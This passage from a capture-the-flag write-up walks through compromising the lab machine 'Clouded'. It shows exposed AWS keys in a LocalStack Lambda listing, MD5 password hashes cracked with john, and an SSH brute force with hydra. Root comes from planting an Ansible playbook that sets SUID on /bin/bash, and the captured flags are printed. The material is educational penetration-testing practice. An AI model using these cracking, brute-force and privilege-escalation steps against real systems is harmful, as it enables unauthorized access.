<span class="code-cyan">$</span> <span class="code-dark-green">aws</span> --endpoint-url=http://local.clouded.htb lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "UploadToS3",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:UploadToS3",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::000000000000:role/LambdaS3Access",
            "Handler": "handler.lambda_handler",
            "CodeSize": 21510285,
            "Description": "",
            "Timeout": 10,
            "LastModified": "2024-12-17T00:00:16.636+0000",
            "CodeSha256": "CxUb8kp80KqTa/tzdVQeTVFqo0Nhs0W2AwRKeuplCXE=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "Environment": {
                "Variables": {
                    "AWS_ACCESS_KEY_ID": "AKIA5M34BDN8GCJGRFFB",
                    "AWS_SECRET_ACCESS_KEY": "eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUY"  
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "21acfad8-815d-43ae-8143-2810648fb5e8",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
</code></pre></div><p>There is only one Lambda function. As it name says, it uploads files to S3. Therefore, there is also an S3 service deployed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">aws</span> --endpoint-url=http://local.clouded.htb s3 ls
2024-12-17 00:00:08 uploads
2024-12-17 00:00:10 clouded-internal

<span class="code-cyan">$</span> <span class="code-dark-green">aws</span> --endpoint-url=http://local.clouded.htb s3 ls s3://clouded-internal  
2024-12-17 00:00:13      16384 backup.db
</code></pre></div><p>That <code>backup.db</code> from the <code>clouded-internal</code> bucket looks so interesting. Let&rsquo;s download it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">aws</span> --endpoint-url=http://local.clouded.htb s3 cp s3://clouded-internal/backup.db .  
download: s3://clouded-internal/backup.db to ./backup.db
</code></pre></div><p>We could continue enumerating LocalStack, but there is nothing more up there. We could have read the Lambda function source code, obtain a reverse shell on a Lambda container, but it is a dead end.</p><p>Instead, let&rsquo;s take a look at the <code>backup.db</code> file, which is a SQLite database:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">sqlite> .tables
frontiers
sqlite> .schema frontiers
CREATE TABLE IF NOT EXISTS "frontiers" (  
        "first_name"    TEXT,
        "last_name"     TEXT,
        "department"    TEXT,
        "frontier_level"        TEXT,
        "password"      TEXT
);
</code></pre></div><p>Perfect! We&rsquo;ve got a bunch of usernames and password hashes (probably MD5):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">sqlite> select * from frontiers;
Jax|Blackstone|Cybersecurity Frontier|Star Tech Cadet|0691df26da82d6eb2e5da8924628db63
Colt|Dray|Orbital Analytics|Keeper of the Spur|ae0eea6eb6d63f98da42de867c47a0f8
Ember|Frost|Quantum Systems|Starwarden|680e89809965ec41e64dc7e447f175ab
Kael|Stark|Astroinformatics|Frontier Architect|f63f4fbc9f8c85d409f2f59f2b9e12d5
Nova|Voss|Terraforming Tech|Star Tech Cadet|dba0079f1cb3a3b56e102dd5e04fa2af
Vira|Wyler|Galactic Communications|Signal Engineer|968c58d88d981b4ee15e2c8cb1fab06d
Zane|Korr|Power Grid Dynamics|Code Marshal|a90f4589534f75e93dbccd20329ed946
Lyra|Nex|Starship AI Division|Keeper of the Spur|91111fb1f8b088438d80367df81cb6cf
Arlo|Halcyon|Neural Nexus|Systems Pioneer|02b0732024cad6ad3dc2989bc82a1ef5
Orion|Solace|Signal Operations|Starwarden|d2feb9b6718bb374dfdd689380676954
Vesper|Talon|Galactic Communications|Frontier Architect|467b6140fe3bb958f2332983914de787  
Pax|Irons|Quantum Systems|Data Scout|2aee1c40199c7754da766e61452612cc
Cleo|Nagato|Astroinformatics|Code Marshal|e94ef563867e9c9df3fcc999bdb045f5
Rynn|Verin|Void Engineering|Star Tech Cadet|532ab4d2bbcc461398d494905db10c95
Kyra|Ashcroft|Terraforming Tech|Comms Wrangler|7d37c580f9c36fa004af865448a6e278
Soren|Stroud|System Integrity Core|Keeper of the Spur|b08c8c585b6d67164c163767076445d6
Thorne|Ashford|Starship AI Division|Signal Engineer|069a6a9ccaaca7967a0c43cb5e161187
Aerin|Vail|Cybersecurity Frontier|Star Tech Cadet|83de6260ed1dbe549bd23d31c4b8af81
Juno|Quill|Data Forge|Cyber Outrider|361519f98f2c121f3abd457adc415ad9
Kaden|Kade|Neural Nexus|Systems Pioneer|365816905f5e9c148e20273719fe163d
Elara|Drax|Quantum Systems|Cyber Outrider|78842815248300fa6ae79f7776a5080a
Dax|Mason|Galactic Communications|Code Marshal|6ebe76c9fb411be97b3b0d48b791a7c9
Tessa|Hawk|Signal Operations|Starwarden|df53ca268240ca76670c8566ee54568a
Kiera|Carver|Astroinformatics|Data Scout|008c5926ca861023c1d2a36653fd88e2
Valen|Locke|Power Grid Dynamics|Systems Pioneer|8621ffdbc5698829397d97767ac13db3
Juno|Wolfe|Frontier Robotics|Signal Engineer|282bbbfb69da08d03ff4bcf34a94bc53
Calix|Rook|Orbital Analytics|Comms Wrangler|2dccd1ab3e03990aea77359831c85ca2
Rhea|Steele|Starship AI Division|Keeper of the Spur|cf9ee5bcb36b4936dd7064ee9b2f139e
Lira|Kyros|Void Engineering|Code Marshal|6b1628b016dff46e6fa35684be6acc96
Cass|Hunt|Data Forge|Star Tech Cadet|de1e3b0952476aae6888f98ea0e4ac11
Rowan|Calder|Cybersecurity Frontier|Starwarden|e1964798cfe86e914af895f8d0291812
Astra|Brogan|Neural Nexus|Comms Wrangler|cb07901c53218323c4ceacdea4b23c98
Bex|Stryker|Galactic Communications|Frontier Architect|b03e3fd2b3d22ff6df2796c412b09311
Nyx|Vale|Astroinformatics|Data Scout|92290ccb8f7b2beb4c57ef1f7a3d5947
Talon|Fennec|Terraforming Tech|Cyber Outrider|7d8bc5f1a8d3787d06ef11c97d4655df
Mira|Drake|Quantum Systems|Star Tech Cadet|d487dd0b55dfcacdd920ccbdaeafa351
Kaine|Sabre|System Integrity Core|Starwarden|07a88e756847244f3496f63f473d6085
Juno|Cross|Power Grid Dynamics|Keeper of the Spur|2760c7b84d4bad6b0b12d7c1a6c5e1a4
Halcyon|Ward|Signal Operations|Frontier Architect|4d5257e5acc7fcac2f5dcd66c4e78f9a
Nia|Vireo|Starship AI Division|Signal Engineer|ac3665f6acae8bd267ed92a71a71313b
Zira|Vance|Orbital Analytics|Star Tech Cadet|eb415b465d61eada8661cb4bda71a4e7
Max|Wren|Data Forge|Comms Wrangler|a17b48e31806e6bb63f64cafb2b06780
Caden|Fury|Void Engineering|Data Scout|7eef7295c50d70615433858746056bca
Lira|Slate|Cybersecurity Frontier|Keeper of the Spur|cd880b726e0a0dbd4237f10d15da46f4
Selene|Vesper|System Integrity Core|Code Marshal|33da7a40473c1637f1a2e142f4925194
Jett|Briar|Terraforming Tech|Cyber Outrider|177dacb14b34103960ec27ba29bd686b
Renzo|Shadow|Frontier Robotics|Star Tech Cadet|7902b7c0be5cedb6fbada8d4c7fc42a0
Sol|Ravenwood|Galactic Communications|Systems Pioneer|55e7dd3016ce4ac57b9a0f56af12f7c2
Lex|West|Signal Operations|Starwarden|21bb5bb51758eab175d4d640334abba0
Thorne|Lyon|Neural Nexus|Frontier Architect|c25a68128b55eab863ac1bfcfbb4c80a
</code></pre></div><p>Let&rsquo;s take all password hashes to crack them with <code>john</code> and <code>rockyou.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">sqlite> select password from frontiers;  
0691df26da82d6eb2e5da8924628db63
ae0eea6eb6d63f98da42de867c47a0f8
680e89809965ec41e64dc7e447f175ab
...
55e7dd3016ce4ac57b9a0f56af12f7c2
21bb5bb51758eab175d4d640334abba0
c25a68128b55eab863ac1bfcfbb4c80a
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt --format=Raw-MD5 <span class="code-magenta">&lt;(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">'0691df26da82d6eb2e5da8924628db63</span>  
<span class="code-dark-yellow">ae0eea6eb6d63f98da42de867c47a0f8</span>
<span class="code-dark-yellow">680e89809965ec41e64dc7e447f175ab</span>
...
<span class="code-dark-yellow">55e7dd3016ce4ac57b9a0f56af12f7c2</span>
<span class="code-dark-yellow">21bb5bb51758eab175d4d640334abba0</span>
<span class="code-dark-yellow">c25a68128b55eab863ac1bfcfbb4c80a'</span><span class="code-magenta">)</span>
Using default input encoding: UTF-8
Loaded 50 password hashes with no different salts (Raw-MD5 [MD5 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-yellow">jonathan</span>         (<span class="code-dark-yellow">?</span>)
<span class="code-dark-yellow">987654321</span>        (<span class="code-dark-yellow">?</span>)
<span class="code-dark-yellow">computer</span>         (<span class="code-dark-yellow">?</span>)
...
<span class="code-dark-yellow">cookies</span>          (<span class="code-dark-yellow">?</span>)
<span class="code-dark-yellow">leslie</span>           (<span class="code-dark-yellow">?</span>)
<span class="code-dark-yellow">jackass</span>          (<span class="code-dark-yellow">?</span>)
50g 0:00:00:00 DONE (2024-12-15 01:10) 5000g/s 204800p/s 204800c/s 10240KC/s 123456..lovers1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
</code></pre></div><h3 id="access-via-ssh">Access via SSH</h3><p>Having found all these users and passwords, we might want to check if we can reuse any credential in other services, for instance, in SSH. We can make use of <a target="_blank" href="https://github.com/vanhauser-thc/thc-hydra"><code>hydra</code></a> to perform a brute force attack with these wordlists. However, it looks like none of the credentials work directly. Even using the <code>last_name</code> instead of the <code>first_name</code>&mldr;</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">hydra</span> -C <span class="mtku">creds.txt</span> clouded.htb ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries, ~7 tries per task
[DATA] attacking ssh://clouded.htb:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
</code></pre></div><p>At this point, we could continue enumerating the AWS environment, but there&rsquo;s nothing more to do there. So, we must continue trying to access via SSH. In the end, we can use a wordlist for both <code>first_name</code> and <code>last_name</code> values and another wordlist with the passwords, so that we try every username with every password (<code>(2 * 50) * 50 = 5000</code> possibilities). It might be worth it&mldr;</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">sqlite> select lower(first_name) from frontiers union select lower(last_name) from frontiers;  
aerin
arlo
ashcroft
...
wyler
zane
zira
</code></pre></div><p>And there it is!</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">hydra</span> -L <span class="mtku">usernames.txt</span> -P <span class="mtku">passwords.txt</span> clouded.htb ssh
</span>Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>  

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4650 login tries (l:93/p:50), ~291 tries per task
[DATA] attacking ssh://clouded.htb:22/
[STATUS] 283.00 tries/min, 283 tries in 00:01h, 4367 to do in 00:16h, 16 active
[STATUS] 282.00 tries/min, 846 tries in 00:03h, 3804 to do in 00:14h, 16 active
[STATUS] 275.71 tries/min, 1930 tries in 00:07h, 2720 to do in 00:10h, 16 active
[<span class="code-green">22</span>][<span class="code-green">ssh</span>] host: <span class="code-green">clouded.htb</span>   login: <span class="code-green">nagato</span>   password: <span class="code-green">alicia</span>
[STATUS] 272.17 tries/min, 3266 tries in 00:12h, 1384 to do in 00:06h, 16 active
[STATUS] 273.53 tries/min, 4650 tries in 00:17h, 1 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
</code></pre></div><p>I was a bit confused on why we had to mix all usernames and passwords, because it doesn&rsquo;t make sense. After digging a bit, it happened that <code>john</code> didn&rsquo;t keep the original order&mldr;</p><p>Whatever&mldr; With this, we can access via SSH and get the first flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> nagato@clouded.htb
nagato@clouded.htb's password:  
<span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ cat user.txt
HTB{L@MBD@_5AY5_B@@}
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>Once inside the machine, we must enumerate the system to look for ways to escalate privileges to <code>root</code>. One of the checks is to look for interesting files. For instance, at <code>/opt</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ ls /opt
<span class="code-blue">containerd</span>  <span class="code-blue">infra-setup</span>
<span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ ls /opt/infra-setup/
checkup.yml
<span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ cat /opt/infra-setup/checkup.yml
- name: Check Stability of Clouded File Sharing Service
  hosts: localhost
  gather_facts: false

  tasks:
    - name: Check if the Clouded File Sharing service is running and if the AWS connection is stable  
      debug:
        msg: "Checking if Clouded File Sharing service is running."
    # NOTE to Yuki - Add checks for verifying the above tasks
</code></pre></div><p>This YAML file seems to be related with the local cloud that is deployed in the machine. Let&rsquo;s enumerate running processes with <code>pspy</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">scp</span> <span class="mtku">pspy64s</span> nagato@clouded.htb:/tmp
nagato@clouded.htb's password:
pspy64s                                       100% 1129KB 852.5KB/s   00:01  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ chmod +x /tmp/pspy64s
<span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ !$
/tmp/pspy64s
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)  
Draining file system events due to startup...
done
...
<span class="code-blue">CMD: UID=0    PID=4207   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/infra-setup/*.yml </span>
<span class="code-blue">CMD: UID=0    PID=4208   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/infra-setup/checkup.yml </span>
<span class="code-blue">CMD: UID=0    PID=4209   | /usr/sbin/CRON -f </span>
<span class="code-blue">CMD: UID=0    PID=4210   | sleep 10 </span>
<span class="code-blue">CMD: UID=0    PID=4211   | python3 /usr/bin/ansible-playbook /opt/infra-setup/checkup.yml </span>
<span class="code-blue">CMD: UID=0    PID=4213   | </span>
<span class="code-blue">CMD: UID=0    PID=4214   | ssh -o ControlPersist </span>
<span class="code-blue">CMD: UID=0    PID=4216   | python3 /usr/bin/ansible-playbook /opt/infra-setup/checkup.yml </span>
...
</code></pre></div><p>There it is! The <code>root</code> user is running <code>ansible-playbook-parallel</code> on all YAML files located at <code>/opt/infra-setup</code>. Notice that we have write permissions here:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ ls -la /opt/infra-setup/
total 12
drwxrwxr-x 2 root frontiers 4096 Dec 15 23:48 <span class="code-blue">.</span>
drwxr-xr-x 4 root root      4096 Dec  2 06:44 <span class="code-blue">..</span>
-rw-r--r-- 1 root root       351 Dec 15 23:48 checkup.yml  
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>With <a target="_blank" href="https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_intro.html">Ansible Playbooks</a> it is possible to run system commands (more information <a target="_blank" href="https://github.com/germainlefebvre4/ansible-cheatsheet">here</a>), so we simply add SUID permissions to <code>/bin/bash</code> (there is also a <a target="_blank" href="https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo">GTFOBin</a>).</p><p>We first create a YAML file with the actions we want to trigger:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">- </span><span class="mtk5">hosts</span><span class="mtk1">: </span><span class="mtk4">localhost</span>
<span class="mtk1">  </span><span class="mtk5">tasks</span><span class="mtk1">:</span>
<span class="mtk1">  - </span><span class="mtk5">command</span><span class="mtk1">: </span><span class="mtk4">chmod u+s /bin/bash</span>  
</code></pre></div><p>At this point, we write the file and wait a bit until <code>/bin/bash</code> is set to a SUID binary to get access as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-green">/bin/bash</span>  
<span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ cat &gt; /opt/infra-setup/privesc.yml
- hosts: localhost
  tasks:
  - command: chmod u+s /bin/bash
^C
<span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-white code-bg-red">/bin/bash</span>
<span class="code-green">nagato@clouded</span>:<span class="code-blue">~</span>$ bash -p
bash-5.0# cd /root/root.txt
HTB{H@ZY_71ME5_AH3AD}
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-xxe">Exploiting XXE</a></li><li><a href="#localstack-enumeration">LocalStack enumeration</a></li><li><a href="#access-via-ssh">Access via SSH</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>